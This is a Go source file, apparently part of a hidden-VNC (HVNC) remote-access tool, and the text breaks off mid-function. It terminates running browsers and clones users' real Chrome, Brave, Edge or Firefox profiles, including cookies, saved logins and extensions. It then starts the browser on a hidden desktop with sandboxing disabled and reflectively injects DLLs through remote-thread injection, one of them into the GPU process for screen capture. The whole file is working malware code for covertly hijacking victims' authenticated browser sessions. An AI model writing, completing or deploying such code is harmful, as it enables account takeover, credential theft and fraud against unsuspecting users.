//go:build windows

package capture

import (
	"encoding/binary"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

var (
	procOpenProcess           = kernel32.NewProc("OpenProcess")
	procVirtualAllocEx        = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory    = kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread    = kernel32.NewProc("CreateRemoteThread")
	procWaitForSingleObject   = kernel32.NewProc("WaitForSingleObject")
	procCloseHandle           = kernel32.NewProc("CloseHandle")
	procResumeThread          = kernel32.NewProc("ResumeThread")
	procOpenProcessToken      = advapi32.NewProc("OpenProcessToken")
	procLookupPrivilegeValueW = advapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges = advapi32.NewProc("AdjustTokenPrivileges")
	procCreateFileMappingW    = kernel32.NewProc("CreateFileMappingW")
	procMapViewOfFile         = kernel32.NewProc("MapViewOfFile")
	procUnmapViewOfFile       = kernel32.NewProc("UnmapViewOfFile")
)

var advapi32 = syscall.NewLazyDLL("advapi32.dll")

type CloneProgressFunc func(percent int, copiedBytes, totalBytes int64, status string)
type DXGIStatusFunc func(success bool, gpuPID uint32, message string)

var hvncDXGIStatusCallback atomic.Value

const (
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
	PROCESS_ALL_ACCESS_INJ    = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ

	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40

	INFINITE_WAIT = 0xFFFFFFFF

	TOKEN_ADJUST_PRIVILEGES = 0x0020
	TOKEN_QUERY             = 0x0008
	SE_PRIVILEGE_ENABLED    = 0x00000002

	CREATE_SUSPENDED           = 0x00000004
	CREATE_UNICODE_ENVIRONMENT = 0x00000400

	IMAGE_DIRECTORY_ENTRY_EXPORT  = 0
	IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b
	IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b
)

// enableDebugPrivilege attempts to enable SeDebugPrivilege for the current process.
func enableDebugPrivilege() {
	var hToken uintptr
	currentProcess, _, _ := kernel32.NewProc("GetCurrentProcess").Call()
	ret, _, _ := procOpenProcessToken.Call(currentProcess, TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
	if ret == 0 {
		return
	}
	defer procCloseHandle.Call(hToken)

	seDebug, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")
	type luid struct {
		LowPart  uint32
		HighPart int32
	}
	type luidAndAttributes struct {
		Luid       luid
		Attributes uint32
	}
	type tokenPrivileges struct {
		PrivilegeCount uint32
		Privileges     luidAndAttributes
	}
	var tp tokenPrivileges
	tp.PrivilegeCount = 1
	tp.Privileges.Attributes = SE_PRIVILEGE_ENABLED

	ret, _, _ = procLookupPrivilegeValueW.Call(0, uintptr(unsafe.Pointer(seDebug)), uintptr(unsafe.Pointer(&tp.Privileges.Luid)))
	if ret == 0 {
		return
	}
	procAdjustTokenPrivileges.Call(hToken, 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
}

// StartHVNCProcessInjected starts a process suspended on the HVNC desktop,
// injects the reflective DLL, then resumes it.
// searchPath/replacePath are passed as environment variables for the DLL hooks.
func StartHVNCProcessInjected(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string) error {
	if filePath == "" {
		return fmt.Errorf("empty file path")
	}
	if len(dllBytes) == 0 {
		return fmt.Errorf("empty DLL bytes")
	}

	result, err := executeHVNCTask(hvncTask{
		kind:            hvncTaskStartProcessInjected,
		filePath:        filePath,
		dllBytes:        dllBytes,
		captureDllBytes: captureDllBytes,
		searchPath:      searchPath,
		replacePath:     replacePath,
	}, 30*time.Second)
	if err != nil {
		return err
	}
	return result.err
}

// StartHVNCBrowserInjected starts a browser on the HVNC desktop with injection.
// If clone is true, it clones the real profile so file I/O is redirected to the clone.
// If clone is false, it starts the browser with injection but no path redirection.
// browser should be one of: "chrome", "brave", "edge".
func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, captureDllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc) error {
	if onDXGIStatus != nil {
		hvncDXGIStatusCallback.Store(onDXGIStatus)
	}
	info, ok := browserInfoMap[strings.ToLower(browser)]
	if !ok {
		return fmt.Errorf("unknown browser %q", browser)
	}

	if exePath == "" {
		exePath = findBrowserExe(info)
		if exePath == "" {
			return fmt.Errorf("%s not found", info.name)
		}
	}

	if killIfRunning && clone {
		processName := info.exeName
		if processName == "" {
			processName = filepath.Base(exePath)
		}
		if isProcessRunning(processName) {
			log.Printf("hvnc %s: killing running %s before cloning", info.name, processName)
			killProcess(processName)
			time.Sleep(1500 * time.Millisecond)
		}
	}

	if !clone {
		log.Printf("hvnc %s: starting without profile cloning", info.name)
		return StartHVNCProcessInjected(exePath, dllBytes, captureDllBytes, "", "")
	}

	realUserData := getBrowserUserDataDir(info)
	if realUserData == "" {
		return fmt.Errorf("could not determine %s user data directory", info.name)
	}
	log.Printf("hvnc %s: real user data at %s", info.name, realUserData)

	cloneDir, err := cloneBrowserProfile(info.name, realUserData, cloneLite, onProgress)
	if err != nil {
		return fmt.Errorf("profile clone failed: %v", err)
	}
	log.Printf("hvnc %s: cloned profile to %s", info.name, cloneDir)

	if info.isFirefox {
		for _, lockFile := range []string{"parent.lock", "lock"} {
			filepath.Walk(cloneDir, func(path string, fi os.FileInfo, err error) error {
				if err != nil || fi.IsDir() {
					return nil
				}
				if strings.EqualFold(fi.Name(), lockFile) {
					os.Remove(path)
					log.Printf("hvnc %s: removed lock file %s", info.name, path)
				}
				return nil
			})
		}
	} else {
		for _, lockFile := range []string{"SingletonLock", "SingletonCookie", "SingletonSocket"} {
			lp := filepath.Join(cloneDir, lockFile)
			if err := os.Remove(lp); err == nil {
				log.Printf("hvnc %s: removed lock file %s", info.name, lockFile)
			}
		}
	}

	return StartHVNCProcessInjected(exePath, dllBytes, captureDllBytes, realUserData, cloneDir)
}

// StartHVNCChromeInjected is kept for backward compatibility.
func StartHVNCChromeInjected(chromePath string, dllBytes []byte, captureDllBytes []byte) error {
	return StartHVNCBrowserInjected("chrome", chromePath, dllBytes, captureDllBytes, true, false, true, nil, nil)
}

type browserInfo struct {
	name       string
	exeName    string
	exePaths   []string // candidate exe locations (env vars expanded at runtime)
	userData   string   // relative to LOCALAPPDATA (or APPDATA for Firefox)
	useAppData bool     // true = use APPDATA instead of LOCALAPPDATA
	isFirefox  bool     // true for Firefox (different profile structure)
}

var browserInfoMap = map[string]browserInfo{
	"chrome": {
		name:    "Chrome",
		exeName: "chrome.exe",
		exePaths: []string{
			`\Google\Chrome\Application\chrome.exe`,
		},
		userData: `Google\Chrome\User Data`,
	},
	"brave": {
		name:    "Brave",
		exeName: "brave.exe",
		exePaths: []string{
			`\BraveSoftware\Brave-Browser\Application\brave.exe`,
		},
		userData: `BraveSoftware\Brave-Browser\User Data`,
	},
	"edge": {
		name:    "Edge",
		exeName: "msedge.exe",
		exePaths: []string{
			`\Microsoft\Edge\Application\msedge.exe`,
		},
		userData: `Microsoft\Edge\User Data`,
	},
	"firefox": {
		name:    "Firefox",
		exeName: "firefox.exe",
		exePaths: []string{
			`\Mozilla Firefox\firefox.exe`,
		},
		userData:   `Mozilla\Firefox`,
		useAppData: true,
		isFirefox:  true,
	},
}

func findBrowserExe(info browserInfo) string {
	roots := []string{
		os.Getenv("ProgramFiles"),
		os.Getenv("ProgramFiles(x86)"),
		os.Getenv("LOCALAPPDATA"),
	}
	for _, root := range roots {
		if root == "" {
			continue
		}
		for _, suffix := range info.exePaths {
			p := root + suffix
			if _, err := os.Stat(p); err == nil {
				return p
			}
		}
	}
	return ""
}

func isProcessRunning(name string) bool {
	snapshot, _, _ := kernel32.NewProc("CreateToolhelp32Snapshot").Call(0x2, 0)
	if snapshot == uintptr(^uintptr(0)) {
		return false
	}
	defer procCloseHandle.Call(snapshot)

	type processEntry32 struct {
		Size            uint32
		CntUsage        uint32
		ProcessID       uint32
		DefaultHeapID   uintptr
		ModuleID        uint32
		CntThreads      uint32
		ParentProcessID uint32
		PriClassBase    int32
		Flags           uint32
		ExeFile         [260]uint16
	}

	var entry processEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	ret, _, _ := kernel32.NewProc("Process32FirstW").Call(snapshot, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return false
	}
	target := strings.ToLower(name)
	for {
		exeName := syscall.UTF16ToString(entry.ExeFile[:])
		if strings.ToLower(exeName) == target {
			return true
		}
		entry.Size = uint32(unsafe.Sizeof(entry))
		ret, _, _ = kernel32.NewProc("Process32NextW").Call(snapshot, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}
	return false
}

func killProcess(name string) {
	snapshot, _, _ := kernel32.NewProc("CreateToolhelp32Snapshot").Call(0x2, 0)
	if snapshot == uintptr(^uintptr(0)) {
		return
	}
	defer procCloseHandle.Call(snapshot)

	type processEntry32 struct {
		Size            uint32
		CntUsage        uint32
		ProcessID       uint32
		DefaultHeapID   uintptr
		ModuleID        uint32
		CntThreads      uint32
		ParentProcessID uint32
		PriClassBase    int32
		Flags           uint32
		ExeFile         [260]uint16
	}

	var entry processEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	ret, _, _ := kernel32.NewProc("Process32FirstW").Call(snapshot, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return
	}
	target := strings.ToLower(name)
	for {
		exeName := syscall.UTF16ToString(entry.ExeFile[:])
		if strings.ToLower(exeName) == target {
			hProc, _, _ := procOpenProcess.Call(0x0001, 0, uintptr(entry.ProcessID)) // PROCESS_TERMINATE
			if hProc != 0 {
				kernel32.NewProc("TerminateProcess").Call(hProc, 0)
				procCloseHandle.Call(hProc)
				log.Printf("hvnc: terminated %s (PID %d)", name, entry.ProcessID)
			}
		}
		entry.Size = uint32(unsafe.Sizeof(entry))
		ret, _, _ = kernel32.NewProc("Process32NextW").Call(snapshot, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}
}

func getBrowserUserDataDir(info browserInfo) string {
	base := os.Getenv("LOCALAPPDATA")
	if info.useAppData {
		base = os.Getenv("APPDATA")
	}
	if base == "" {
		return ""
	}
	dir := filepath.Join(base, info.userData)
	if fi, err := os.Stat(dir); err == nil && fi.IsDir() {
		return dir
	}
	return ""
}

// isFirefoxProfile checks if a directory name matches Firefox profile naming convention.
// Firefox profiles have names like "xxxxx.default-release", "xxxxx.default-esr", etc.
func isFirefoxProfile(name string) bool {
	lower := strings.ToLower(name)
	return strings.Contains(lower, ".default-release") ||
		strings.Contains(lower, ".default-esr") ||
		strings.Contains(lower, ".default")
}

// cloneBrowserProfile clones the browser user data directory, skipping only
// large cache directories that aren't needed for a functional session.
// This preserves extensions, cookies, login data, local storage, etc.
func cloneBrowserProfile(browserName string, srcUserData string, lite bool, onProgress CloneProgressFunc) (string, error) {
	prefix := "hvnc_" + strings.ToLower(browserName) + "_"
	// Remove any previous cloned profile directories so we always use fresh data
	tmpDir := os.TempDir()
	if old, err := os.ReadDir(tmpDir); err == nil {
		for _, e := range old {
			if strings.HasPrefix(e.Name(), prefix) && e.IsDir() {
				p := filepath.Join(tmpDir, e.Name())
				log.Printf("hvnc %s: removing old clone %s", browserName, p)
				os.RemoveAll(p)
			}
		}
	}

	cloneBase := filepath.Join(tmpDir, prefix+fmt.Sprintf("%d", time.Now().UnixNano()))
	if err := os.MkdirAll(cloneBase, 0700); err != nil {
		return "", fmt.Errorf("mkdir clone: %v", err)
	}

	// Directories to skip — these are large caches that aren't needed
	skipDirs := map[string]bool{
		"cache":          true,
		"code cache":     true,
		"gpucache":       true,
		"service worker": true,
		"crashpad":       true,
		"blob_storage":   true,
		"jumplisterrors": true,
		"optimization_guide_prediction_model_downloads": true,
		"segmentation_platform":                         true,
		"commerce_local_db":                             true,
	}

	if lite {
		log.Printf("hvnc %s: lite clone — skipping extensions and extra data", browserName)
		liteSkip := []string{
			"extensions",
			"extension state",
			"extension scripts",
			"extension rules",
			"local extension settings",
			"sync extension settings",
			"indexeddb",
			"file system",
			"session storage",
			"sessions",
			"sync data",
			"web applications",
			"webrtc internals",
			"databases",
			"platform notifications",
			"gcm store",
			"storage",
			"feature_engagement_tracker",
		}
		for _, d := range liteSkip {
			skipDirs[d] = true
		}
	}

	entries, err := os.ReadDir(srcUserData)
	if err != nil {
		return "", fmt.Errorf("read user data dir: %v", err)
	}

	// Calculate total size for progress reporting
	var totalBytes int64
	if onProgress != nil {
		onProgress(0, 0, 0, "scanning")
		totalBytes = calcCloneSize(srcUserData, skipDirs)
		onProgress(0, 0, totalBytes, "cloning")
	}

	type copyJob struct {
		src string
		dst string
	}
	var jobs []copyJob

	collectFile := func(src, dst string) {
		jobs = append(jobs, copyJob{src: src, dst: dst})
	}

	// Get browser info to check if it's Firefox
	isFirefox := false
	for _, bi := range browserInfoMap {
		if strings.EqualFold(bi.name, browserName) {
			isFirefox = bi.isFirefox
			break
		}
	}

	for _, entry := range entries {
		name := entry.Name()
		src := filepath.Join(srcUserData, name)
		dst := filepath.Join(cloneBase, name)

		if entry.IsDir() {
			// Check if this is a profile directory
			isProfile := false
			if isFirefox {
				// Firefox profiles have names like "xxxxx.default-release"
				isProfile = isFirefoxProfile(name)
			} else {
				// Chrome-based browsers use "Default" or "Profile X"
				isProfile = strings.EqualFold(name, "Default") || strings.HasPrefix(name, "Profile ")
			}

			if isProfile {
				collectProfileDir(src, dst, skipDirs, collectFile)
			} else if !skipDirs[strings.ToLower(name)] {
				collectDirFiles(src, dst, collectFile)
			}
		} else {
			collectFile(src, dst)
		}
	}

	log.Printf("hvnc %s: cloning %d files using parallel workers", browserName, len(jobs))

	dirs := make(map[string]struct{})
	for _, j := range jobs {
		dirs[filepath.Dir(j.dst)] = struct{}{}
	}
	for d := range dirs {
		os.MkdirAll(d, 0700)
	}

	const numWorkers = 8
	jobCh := make(chan copyJob, 256)
	var wg sync.WaitGroup
	var copiedBytes atomic.Int64
	var lastPercent atomic.Int32
	lastPercent.Store(-1)

	reportProgress := func(n int64) {
		if onProgress == nil || totalBytes <= 0 || n <= 0 {
			return
		}
		cur := copiedBytes.Add(n)
		pct := int32(cur * 100 / totalBytes)
		if pct > 100 {
			pct = 100
		}
		prev := lastPercent.Load()
		if pct > prev && lastPercent.CompareAndSwap(prev, pct) {
			onProgress(int(pct), cur, totalBytes, "cloning")
		}
	}

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for job := range jobCh {
				n, err := forceCopyFile(job.src, job.dst)
				if err != nil {
					log.Printf("hvnc %s: warning: could not copy %s: %v", browserName, job.src, err)
				} else {
					reportProgress(n)
				}
			}
		}()
	}

	for _, job := range jobs {
		jobCh <- job
	}
	close(jobCh)
	wg.Wait()

	if onProgress != nil {
		onProgress(100, totalBytes, totalBytes, "done")
	}

	return cloneBase, nil
}

func collectProfileDir(src, dst string, skipDirs map[string]bool, collect func(string, string)) {
	entries, err := os.ReadDir(src)
	if err != nil {
		return
	}
	for _, entry := range entries {
		name := entry.Name()
		s := filepath.Join(src, name)
		d := filepath.Join(dst, name)
		if entry.IsDir() {
			if skipDirs[strings.ToLower(name)] {
				continue
			}
			collectDirFiles(s, d, collect)
		} else {
			collect(s, d)
		}
	}
}

func collectDirFiles(src, dst string, collect func(string, string)) {
	filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		rel, _ := filepath.Rel(src, path)
		collect(path, filepath.Join(dst, rel))
		return nil
	})
}

// calcCloneSize walks the source user data directory and returns the total
// byte count of files that would be copied (respecting skipDirs).
func calcCloneSize(srcUserData string, skipDirs map[string]bool) int64 {
	var total int64
	entries, err := os.ReadDir(srcUserData)
	if err != nil {
		return 0
	}

	isFirefox := false
	if strings.Contains(strings.ToLower(srcUserData), "mozilla\\firefox") ||
		strings.Contains(strings.ToLower(srcUserData), "mozilla/firefox") {
		isFirefox = true
	}

	for _, entry := range entries {
		name := entry.Name()
		p := filepath.Join(srcUserData, name)
		if entry.IsDir() {
			isProfile := false
			if isFirefox {
				isProfile = isFirefoxProfile(name)
			} else {
				isProfile = strings.EqualFold(name, "Default") || strings.HasPrefix(name, "Profile ")
			}

			if isProfile {
				total += calcProfileSize(p, skipDirs)
			} else if !skipDirs[strings.ToLower(name)] {
				total += calcDirSize(p)
			}
		} else {
			if info, err := entry.Info(); err == nil {
				total += info.Size()
			}
		}
	}
	return total
}

func calcProfileSize(dir string, skipDirs map[string]bool) int64 {
	var total int64
	entries, err := os.ReadDir(dir)
	if err != nil {
		return 0
	}
	for _, entry := range entries {
		name := entry.Name()
		p := filepath.Join(dir, name)
		if entry.IsDir() {
			if !skipDirs[strings.ToLower(name)] {
				total += calcDirSize(p)
			}
		} else {
			if info, err := entry.Info(); err == nil {
				total += info.Size()
			}
		}
	}
	return total
}

func calcDirSize(dir string) int64 {
	var total int64
	filepath.Walk(dir, func(_ string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if !info.IsDir() {
			total += info.Size()
		}
		return nil
	})
	return total
}

func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string) error {
	if filePath == "" {
		return fmt.Errorf("empty file path")
	}
	if len(dllBytes) == 0 {
		return fmt.Errorf("empty DLL bytes")
	}

	// Create a page-file-backed named section containing the raw DLL bytes.
	// Child processes will open this section to reflectively inject themselves.
	shmHandle, shmName, err := createDLLSharedMemory(dllBytes)
	if err != nil {
		return fmt.Errorf("failed to create DLL shared memory: %v", err)
	}
	log.Printf("hvnc inject: DLL shared memory created as %s (%d bytes)", shmName, len(dllBytes))

	enableDebugPrivilege()

	// Create the process suspended on the HVNC desktop
	hProcess, hThread, pid, err := createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName, len(dllBytes))
	if err != nil {
		procCloseHandle.Call(shmHandle)
		return fmt.Errorf("failed to create suspended process: %v", err)
	}
	log.Printf("hvnc inject: created suspended process PID %d", pid)

	// Inject the reflective DLL
	if err := reflectiveInject(hProcess, dllBytes); err != nil {
		procCloseHandle.Call(hProcess)
		procCloseHandle.Call(hThread)
		terminateProcess(hProcess)
		procCloseHandle.Call(shmHandle)
		return fmt.Errorf("DLL injection failed: %v", err)
	}
	log.Printf("hvnc inject: DLL injected into PID %d", pid)

	// The DLL's InstallNtApiHooks has run (reflectiveInject waits for the
	// loader thread). The DLL opened the shared section, so we can release
	// our handle now.
	procCloseHandle.Call(shmHandle)

	procCloseHandle.Call(hProcess)

	// Resume the main thread
	ret, _, _ := procResumeThread.Call(hThread)
	if ret == 0xFFFFFFFF {
		procCloseHandle.Call(hThread)
		return fmt.Errorf("failed to resume thread")
	}
	procCloseHandle.Call(hThread)

	log.Printf("hvnc inject: process PID %d resumed with DLL hooks active", pid)

	if len(captureDllBytes) > 0 {
		go hvncDeferredGPUInject(pid, captureDllBytes)
	}

	return nil
}

func hvncDeferredGPUInject(browserPID uint32, captureDllBytes []byte) {
	time.Sleep(4 * time.Second)

	for attempt := 0; attempt < 15; attempt++ {
		gpuPID, err := findGPUChildProcess(browserPID)
		if err != nil {
			log.Printf("hvnc inject: GPU child not found for PID %d (attempt %d): %v", browserPID, attempt, err)
			time.Sleep(2 * time.Second)
			continue
		}

		log.Printf("hvnc inject: found GPU child process PID %d for browser PID %d", gpuPID, browserPID)

		hProcess, _, _ := procOpenProcess.Call(PROCESS_ALL_ACCESS_INJ, 0, uintptr(gpuPID))
		if hProcess == 0 {
			log.Printf("hvnc inject: failed to open GPU process PID %d", gpuPID)
			return
		}

		if err := reflectiveInject(hProcess, captureDllBytes); err != nil {
			log.Printf("hvnc inject: HVNCCapture DLL injection into GPU PID %d failed: %v", gpuPID, err)
			procCloseHandle.Call(hProcess)
			if fn, ok := hvncDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
				fn(false, gpuPID, fmt.Sprintf("DXGI injection failed for GPU PID %d", gpuPID))
			}
			return
		}
		procCloseHandle.Call(hProcess)

		log.Printf("hvnc inject: HVNCCapture DLL injected into GPU PID %d", gpuPID)
		hvncRegisterInjectedPID(gpuPID)
		hvncRegisterGPUPID(browserPID, gpuPID)
		if fn, ok := hvncDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
			fn(true, gpuPID, fmt.Sprintf("DXGI capture active (GPU PID %d)", gpuPID))
		}
		return
	}

	log.Printf("hvnc inject: gave up finding GPU child for browser PID %d", browserPID)
	if fn, ok := hvncDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
		fn(false, 0, "DXGI injection failed: GPU process not found")
	}
}

func findGPUChildProcess(parentPID uint32) (uint32, error) {
	children := findChildPIDs(parentPID)
	if len(children) == 0 {
		return 0, fmt.Errorf("no child processes")
	}

	for _, childPID := range children {
		if hasLoadedModule(childPID, "d3d11.dll") {
			return childPID, nil
		}
	}

	return 0, fmt.Errorf("none of %d children have d3d11.dll", len(children))
}

type processEntry32W struct {
	Size            uint32
	CntUsage        uint32
	ProcessID       uint32
	DefaultHeapID   uintptr
	ModuleID        uint32
	CntThreads      uint32
	ParentProcessID uint32
	PriClassBase    int32
	Flags           uint32
	ExeFile         [260]uint16
}

type moduleEntry32W struct {
	Size         uint32
	ModuleID     uint32
	ProcessID    uint32
	GlblcntUsage uint32
	ProccntUsage uint32
	ModBaseAddr  uintptr
	ModBaseSize  uint32
	HModule      uintptr
	SzModule     [256]uint16
	SzExePath    [260]uint16
}

var (
	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW          = kernel32.NewProc("Process32FirstW")
	procProcess32NextW           = kernel32.NewProc("Process32NextW")
	procModule32FirstW           = kernel32.NewProc("Module32FirstW")
	procModule32NextW            = kernel32.NewProc("Module32NextW")
)

const (
	TH32CS_SNAPPROCESS  = 0x00000002
	TH32CS_SNAPMODULE   = 0x00000008
	TH32CS_SNAPMODULE32 = 0x00000010
)

func findChildPIDs(parentPID uint32) []uint32 {
	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if snap == 0 || snap == ^uintptr(0) {
		return nil
	}
	defer procCloseHandle.Call(snap)

	var entry processEntry32W
	entry.Size = uint32(unsafe.Sizeof(entry))
	ret, _, _ := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return nil
	}

	var children []uint32
	for {
		if entry.ParentProcessID == parentPID && entry.ProcessID != parentPID {
			children = append(children, entry.ProcessID)
		}
		entry.Size = uint32(unsafe.Sizeof(entry))
		ret, _, _ = procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}
	return children
}

func hasLoadedModule(pid uint32, moduleName string) bool {
	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPMODULE|TH32CS_SNAPMODULE32, uintptr(pid))
	if snap == 0 || snap == ^uintptr(0) {
		return false
	}
	defer procCloseHandle.Call(snap)

	var entry moduleEntry32W
	entry.Size = uint32(unsafe.Sizeof(entry))
	ret, _, _ := procModule32FirstW.Call(snap, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return false
	}

	target := strings.ToLower(moduleName)
	for {
		name := strings.ToLower(syscall.UTF16ToString(entry.SzModule[:]))
		if name == target {
			return true
		}
		entry.Size = uint32(unsafe.Sizeof(entry))
		ret, _, _ = procModule32NextW.Call(snap, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}
	return false
}

func terminateProcess(hProcess uintptr) {
	kernel32.NewProc("TerminateProcess").Call(hProcess, 1)
}

// createDLLSharedMemory creates a named page-file-backed section containing
// the raw DLL bytes. Returns the mapping handle and section name.
func createDLLSharedMemory(dllBytes []byte) (handle uintptr, name string, err error) {
	name = fmt.Sprintf("Local\\hvnc_rdi_%d", time.Now().UnixNano())
	namePtr, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return 0, "", err
	}

	size := len(dllBytes)
	handle, _, callErr := procCreateFileMappingW.Call(
		^uintptr(0), // INVALID_HANDLE_VALUE
		0,           // default security
		0x04,        // PAGE_READWRITE
		0,           // high-order size
		uintptr(size),
		uintptr(unsafe.Pointer(namePtr)),
	)
	if handle == 0 {
		return 0, "", fmt.Errorf("CreateFileMappingW: %v", callErr)
	}

	view, _, callErr := procMapViewOfFile.Call(
		handle,
		0x2, // FILE_MAP_WRITE
		0, 0,
		uintptr(size),
	)
	if view == 0 {
		procCloseHandle.Call(handle)
		return 0, "", fmt.Errorf("MapViewOfFile: %v", callErr)
	}

	copy(unsafe.Slice((*byte)(unsafe.Pointer(view)), size), dllBytes)

	procUnmapViewOfFile.Call(view)
	return handle, name, nil
}

func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName string, dllSize int) (hProcess, hThread uintptr, pid uint32, err error) {
	desktopNamePtr, err := syscall.UTF16PtrFromString(hvncDesktopName)
	if err != nil {
		return 0, 0, 0, fmt.Errorf("failed to convert desktop name: %v", err)
	}
	args := " --window-position=0,0"
	browserExes := map[string]bool{
		"chrome.exe": true,
		"brave.exe":  true,
		"msedge.exe": true,
	}
	baseName := strings.ToLower(filepath.Base(filePath))
	if browserExes[baseName] {
		args += " --no-sandbox --allow-no-sandbox-job --disable-gpu-sandbox"
	} else if baseName == "firefox.exe" {
		args += " -no-remote -wait-for-browser"
	}
	cmdLine, err := syscall.UTF16FromString(filePath + args)
	if err != nil {
		return 0, 0, 0, fmt.Errorf("failed to convert command line: %v", err)
	}

	var si startupInfo
	var pi processInformation
	si.cb = uint32(unsafe.Sizeof(si))
	si.lpDesktop = desktopNamePtr
	si.dwX = 0
	si.dwY = 0
	si.dwFlags = STARTF_USEPOSITION

	envBlock, err := buildEnvironmentBlock(searchPath, replacePath, shmName, dllSize)
	if err != nil {
		return 0, 0, 0, fmt.Errorf("failed to build environment block: %v", err)
	}

	ret, _, callErr := procCreateProcessW.Call(
		0,
		uintptr(unsafe.Pointer(&cmdLine[0])),
		0,
		0,
		0,
		uintptr(CREATE_SUSPENDED|CREATE_UNICODE_ENVIRONMENT),
		uintptr(unsafe.Pointer(&envBlock[0])),
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		if callErr != nil {
			return 0, 0, 0, fmt.Errorf("CreateProcess failed: %v", callErr)
		}
		return 0, 0, 0, fmt.Errorf("CreateProcess failed")
	}

	return pi.hProcess, pi.hThread, pi.dwProcessId, nil
}

func buildEnvironmentBlock(searchPath, replacePath, shmName string, dllSize int) ([]uint16, error) {
	envStrings := syscall.Environ()

	envStrings = append(envStrings, "RDI_SEARCH_PATH="+searchPath)
	envStrings = append(envStrings, "RDI_REPLACE_PATH="+replacePath)
	if shmName != "" {
		envStrings = append(envStrings, "RDI_DLL_SECTION="+shmName)
		envStrings = append(envStrings, fmt.Sprintf("RDI_DLL_SIZE=%d", dllSize))
	}

	var block []uint16
	for _, s := range envStrings {
		u, err := syscall.UTF16FromString(s)
		if err != nil {
			continue
		}
		block = append(block, u...)
	}
	block = append(block, 0)
	return block, nil
}

func reflectiveInject(hProcess uintptr, dllBytes []byte) error {
	loaderOffset, err := findReflectiveLoaderOffset(dllBytes)
	if err != nil {
		return fmt.Errorf("failed to find ReflectiveLoader: %v", err)
	}
	log.Printf("hvnc inject: ReflectiveLoader at offset 0x%x", loaderOffset)

	remoteBase, _, _ := procVirtualAllocEx.Call(
		hProcess,
		0,
		uintptr(len(dllBytes)),
		MEM_RESERVE|MEM_COMMIT,
		PAGE_EXECUTE_READWRITE,
	)
	if remoteBase == 0 {
		return fmt.Errorf("VirtualAllocEx failed")
	}

	var bytesWritten uintptr
	ret, _, _ := procWriteProcessMemory.Call(
		hProcess,
		remoteBase,
		uintptr(unsafe.Pointer(&dllBytes[0])),
		uintptr(len(dllBytes)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed")
	}

	remoteLoader := remoteBase + uintptr(loaderOffset)

	var threadID uintptr
	hThread, _, _ := procCreateRemoteThread.Call(
		hProcess,
		0,
		1024*1024,
		remoteLoader,
		0,
		0,
		uintptr(unsafe.Pointer(&threadID)),
	)
	if hThread == 0 {
		return fmt.Errorf("CreateRemoteThread failed")
	}

	procWaitForSingleObject.Call(hThread, INFINITE_WAIT)
	procCloseHandle.Call(hThread)

	return nil
}

func findReflectiveLoaderOffset(pe []byte) (uint32, error) {
	if len(pe) < 64 {
		return 0, fmt.Errorf("PE too small")
	}

	if pe[0] != 'M' || pe[1] != 'Z' {
		return 0, fmt.Errorf("invalid DOS signature")
	}
	lfanew := binary.LittleEndian.Uint32(pe[60:64])
	if int(lfanew)+4 > len(pe) {
		return 0, fmt.Errorf("invalid e_lfanew")
	}

	sig := binary.LittleEndian.Uint32(pe[lfanew : lfanew+4])
	if sig != 0x00004550 {
		return 0, fmt.Errorf("invalid PE signature")
	}

	coffOff := lfanew + 4
	if int(coffOff)+20 > len(pe) {
		return 0, fmt.Errorf("PE too small for COFF header")
	}
	numberOfSections := binary.LittleEndian.Uint16(pe[coffOff+2 : coffOff+4])
